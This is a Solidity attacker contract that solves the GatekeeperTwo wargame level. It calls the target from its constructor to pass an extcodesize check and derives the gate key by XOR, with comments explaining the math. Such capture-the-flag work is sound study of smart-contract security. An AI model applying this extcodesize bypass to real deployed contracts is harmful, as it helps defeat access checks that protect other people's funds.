// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./14-GatekeeperTwo.sol";

contract GatekeeperTwoAttacker {
    constructor(address _gatekeeperTwoAddress) public {
        /*We have to make the whole transaction inside
        the constructor. Thanks that extcodesize == 0. */
        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(_gatekeeperTwoAddress);

        /*Operation XOR is commutative and if we make
        A ^ A = 0, and A ^ 0 = A. So if we know that 
        A ^ X = B, where A is the result of 
        uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) and
        B is equal (uint64(0) - 1) then we could calculate X
        A ^ X ^ B  = B ^ B = 0
        X ^ A ^ B ^ A ^ B = 0 ^ A ^ B = A ^ B
        X = A ^ B
        */
        bytes8 _gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1)
        );
        gatekeeperTwo.enter(_gateKey);
    }
}
